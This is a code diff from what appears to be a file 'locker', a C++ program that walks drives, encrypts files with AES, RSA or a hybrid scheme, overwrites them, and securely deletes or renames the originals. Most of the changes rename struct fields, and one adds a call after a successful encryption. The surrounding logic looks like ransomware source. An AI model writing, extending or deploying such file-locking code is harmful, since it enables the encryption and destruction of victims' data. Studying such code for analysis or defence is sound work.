@@ -18,7 +18,7 @@ constexpr unsigned MB = 1048576;
 
 void aes_block_fn(PFILE_INFO FileInfo, crypto_aes_ctx* ctx, u32* padding, BYTE* in, BYTE* out, u32 bytes)
 {
-	aes_encrypt_blocks(ctx, in, out, bytes, padding, FileInfo->CryptInfo->mode);
+	aes_encrypt_blocks(ctx, in, out, bytes, padding, FileInfo->crypt_info->mode);
 }
 
 
@@ -50,17 +50,17 @@ static void HandlerGenKeyAES(crypto_aes_ctx* CryptCtx, CONST BYTE* AESKey)
 
 static bool SymmetricMethodState(PFILE_INFO FileInfo)
 {
-	if (FileInfo->CryptInfo->gen_policy == GENKEY_EVERY_ONCE)
-		FileInfo->CryptInfo->gen_key_method(FileInfo->ctx, GLOBAL_KEYS.g_Key, GLOBAL_KEYS.g_IV);
+	if (FileInfo->crypt_info->gen_policy == GENKEY_EVERY_ONCE)
+		FileInfo->crypt_info->gen_key_method(FileInfo->ctx, GLOBAL_KEYS.g_Key, GLOBAL_KEYS.g_IV);
 
-	return FileInfo->CryptInfo->mode_method(FileInfo);
+	return FileInfo->crypt_info->mode_method(FileInfo);
 }
 
 static bool HybridMethodStateCrypt(PFILE_INFO FileInfo)
 {
 	if (!filesystem::FileCryptEncrypt(FileInfo))
 	{
-		LOG_ERROR("[CryptEncrypt] Failed; " log_str, FileInfo->Filename);
+		LOG_ERROR("[CryptEncrypt] Failed; " log_str, FileInfo->filename);
 		return false;
 	}
 
@@ -71,7 +71,7 @@ static bool HybridMethodStateDecrypt(PFILE_INFO FileInfo)
 {
 	if (!filesystem::FileCryptDecrypt(FileInfo))
 	{
-		LOG_ERROR("[CryptDecrypt] Failed; " log_str, FileInfo->Filename);
+		LOG_ERROR("[CryptDecrypt] Failed; " log_str, FileInfo->filename);
 		return false;
 	}
 
@@ -83,7 +83,7 @@ static bool RSAOnlyMethodState(PFILE_INFO FileInfo)
 {
 	if (!filesystem::EncryptRSA(FileInfo))
 	{
-		LOG_ERROR("[EncryptRSA] Failed Encrypt/Decrypt ONLY RSA; " log_str, FileInfo->Filename);
+		LOG_ERROR("[EncryptRSA] Failed Encrypt/Decrypt ONLY RSA; " log_str, FileInfo->filename);
 		return false;
 	}
 
@@ -471,17 +471,17 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 	{
 		.dcrypt = (int)GLOBAL_ENUM.g_DeCrypt,
 		.ctx = NULL,
-		.CryptInfo = CryptInfo,
-		.Filename = data->Filename,
-		.newFilename = NULL,
-		.FilePath = data->FullPath,
-		.FileHandle = INVALID_HANDLE_VALUE,
-		.newFileHandle = INVALID_HANDLE_VALUE,
-		.Filesize = 0,
+		.crypt_info = CryptInfo,
+		.filename = data->Filename,
+		.recent_filename = NULL,
+		.file_path = data->FullPath,
+		.filehandle = INVALID_HANDLE_VALUE,
+		.recent_filehandle = INVALID_HANDLE_VALUE,
+		.filesize = 0,
 		.padding = 0
 	};
 
-	if((FileInfo->newFilename = filesystem::NameMethodState(CryptInfo, data)) == NULL)
+	if((FileInfo->recent_filename = filesystem::NameMethodState(CryptInfo, data)) == NULL)
 	 	return false;
 
 	if (CryptInfo->gen_policy == GENKEY_EVERY_ONCE)
@@ -495,7 +495,7 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 	else if (CryptInfo->gen_policy == GENKEY_ONCE)
 		FileInfo->ctx = CryptInfo->ctx;
 
-	if (!api::get_parse_file(data->FullPath, &FileInfo->FileHandle, &FileInfo->Filesize) || FileInfo->FileHandle == INVALID_HANDLE_VALUE)
+	if (!api::get_parse_file(data->FullPath, &FileInfo->filehandle, &FileInfo->filesize) || FileInfo->filehandle == INVALID_HANDLE_VALUE)
 	{
 		LOG_ERROR("[SetOptionFileInfo] [ParseFile] Failed; %s", data->Filename);
 		return false;
@@ -503,9 +503,9 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 	
 	if(GLOBAL_STATE.g_write_in)
 	{
-		FileInfo->newFileHandle = FileInfo->FileHandle;
+		FileInfo->recent_filehandle = FileInfo->filehandle;
 	}
-	else if (!api::create_file_open(&FileInfo->newFileHandle, FileInfo->newFilename) || FileInfo->newFileHandle == INVALID_HANDLE_VALUE)
+	else if (!api::create_file_open(&FileInfo->recent_filehandle, FileInfo->recent_filename) || FileInfo->recent_filehandle == INVALID_HANDLE_VALUE)
 	{
 		LOG_ERROR("[SetOptionFileInfo] [CreateFileOpen] Failed; %s", data->Filename);
 		return false;
@@ -516,22 +516,22 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 
 void locker::free_file_info(PFILE_INFO FileInfo, bool success)
 {
-	if (FileInfo->FileHandle != INVALID_HANDLE_VALUE)
-		api::CloseDesc(FileInfo->FileHandle);
-	if (FileInfo->newFileHandle != INVALID_HANDLE_VALUE)
-		api::CloseDesc(FileInfo->newFileHandle);
+	if (FileInfo->filehandle != INVALID_HANDLE_VALUE)
+		api::CloseDesc(FileInfo->filehandle);
+	if (FileInfo->recent_filehandle != INVALID_HANDLE_VALUE)
+		api::CloseDesc(FileInfo->recent_filehandle);
 
-	if (!success) SecureDelete(FileInfo->newFilename);
+	if (!success) SecureDelete(FileInfo->recent_filename);
 	else if (GLOBAL_STATE.g_FlagDelete && !GLOBAL_STATE.g_write_in)
 	{
-		if (!SecureDelete(FileInfo->FilePath))
-			LOG_ERROR("[SecureDelete] Failed; %s", FileInfo->Filename);
+		if (!SecureDelete(FileInfo->file_path))
+			LOG_ERROR("[SecureDelete] Failed; %s", FileInfo->filename);
 	}
 	else if(GLOBAL_STATE.g_write_in)
-		rename(FileInfo->FilePath, FileInfo->newFilename);
+		rename(FileInfo->file_path, FileInfo->recent_filename);
 
-	memory::m_free(FileInfo->newFilename);
-	if (FileInfo->CryptInfo->gen_policy == GENKEY_EVERY_ONCE && FileInfo->ctx) memory::m_free(FileInfo->ctx);
+	memory::m_free(FileInfo->recent_filename);
+	if (FileInfo->crypt_info->gen_policy == GENKEY_EVERY_ONCE && FileInfo->ctx) memory::m_free(FileInfo->ctx);
 	memory::memzero_explicit(FileInfo, sizeof(FILE_INFO));
 }
 
@@ -550,7 +550,7 @@ bool locker::HandlerCrypt
 	if (!(success = CryptInfo->algo_method(&FileInfo)))
 		goto END;
 
-	if (!CryptInfo->overwrite_method(CryptInfo, FileInfo.FileHandle, FileInfo.Filesize))
+	if (!CryptInfo->overwrite_method(CryptInfo, FileInfo.filehandle, FileInfo.filesize))
 		LOG_ERROR("[OverWriteFile] Failed; %s", data->Filename);
 
 	// if (CommandParser::signature &&
@@ -562,7 +562,10 @@ bool locker::HandlerCrypt
 	// 	));
 
 	if(success)
+	{
 		LOG_SUCCESS("success encrypt file; %s", data->Filename);
+		filesystem::fill_struct_hblock(FileInfo.recent_filehandle, CryptInfo->name);
+	}
 	else
 		LOG_ERROR("failed encrypt file; %s", data->Filename);
 
